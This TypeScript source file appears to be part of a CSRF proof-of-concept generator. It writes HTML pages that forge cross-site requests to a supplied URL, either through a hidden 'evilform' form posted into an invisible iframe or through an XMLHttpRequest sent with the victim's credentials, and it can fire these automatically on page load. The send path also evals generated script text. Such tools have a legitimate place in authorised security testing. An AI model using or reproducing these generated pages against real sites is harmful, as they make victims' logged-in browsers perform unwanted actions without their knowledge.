interface sendfunc {
    generate(): boolean;

    generateHTML(title, bodyhtml): string;

    send(): boolean;

    generateSendFunction(): string;
}

class formfunc implements sendfunc {
    generate(): boolean {
        return false;
    }

    generateHTML(title, bodyhtml): string {
        let content: string =
            `${getHTMLheader(title)}
<body${(isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
${bodyhtml}${(!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
${this.generateSendFunction()}
<p>${title}</p>
${getHTMLfooter()}
`;
        return content;
    }

    send(): boolean {
        const req = getRequest();
        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
        const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
        submit();
        return true;
    }

    generateSendFunction(): string {
        let content = `<script>
function csrfSubmit(){
    let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
    submit();
}
</script>
`;
        return content;
    }
}

const forfunc = {
    generate: function () {
        let ezhtml: string = "";
        const req = getRequest();
        if (req === false) return false;
        ezhtml += '<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="' + req['enctype'] + '">\n';
        const params = req['params'];
        for (let i = 0; i < params.length; i++) {
            ezhtml += HTMLrender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!isAutoSubmit() && isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
        }
        ezhtml += '</form>\n';
        ezhtml += '<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
        setEvilHTMLcontent(ezhtml);

        setEvilTextContent(ezhtml);
        errorMsg("");
        return true;
    },

    generateHTML: function (title, bodyhtml) {
    },

    send: function () {
    },


};

const xhrfunc = {
    generate: function () {
        const req = getRequest();
        if (req === false) return false;
        let ezhtml = "";
        ezhtml += "function csrfSubmit(){\n";
        ezhtml += "let xhr=new XMLHttpRequest();\n";
        ezhtml += "xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
        ezhtml += "xhr.withCredentials = true;\n";
        ezhtml += "xhr.setRequestHeader('Content-Type','" + req['enctype'] + "'";
        if (req['enctype'] === "multipart/form-data") ezhtml += "+'; boundary=" + req['boundary'] + "'";
        ezhtml += ");\n";
        ezhtml += "xhr.send('" + escapeJavascript(getParamsRaw()) + "');\n";
        ezhtml += "}\n";
        setEvilTextContent(ezhtml, true);
        setEvilHTMLcontent(ezhtml);
        return true;
    },

    generateHTML: function (title, bodyhtml) {
        let content = getHTMLheader(title);
        content += '<body';
        if (isAutoSubmit()) content += ' onload="csrfSubmit();"';
        content += '>\n';
        content += bodyhtml;
        if (!isAutoSubmit()) content += '<button onclick="csrfSubmit();">submit</button>\n';
        content += '\n<p>' + title + '</p>\n';
        content += '</body>\n';
        content += getHTMLfooter();
        return content;
    },

    send: function () {
        eval(document.getElementById("evilzone").textContent);
        csrfSubmit();
    }
};

function getHTMLheader(title = "CSRF PoC") {
    let content = `<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>${title}</title>
</head>
`;
    return content;
}

function getHTMLfooter() {
    let content = '</html>\n';
    return content;
}
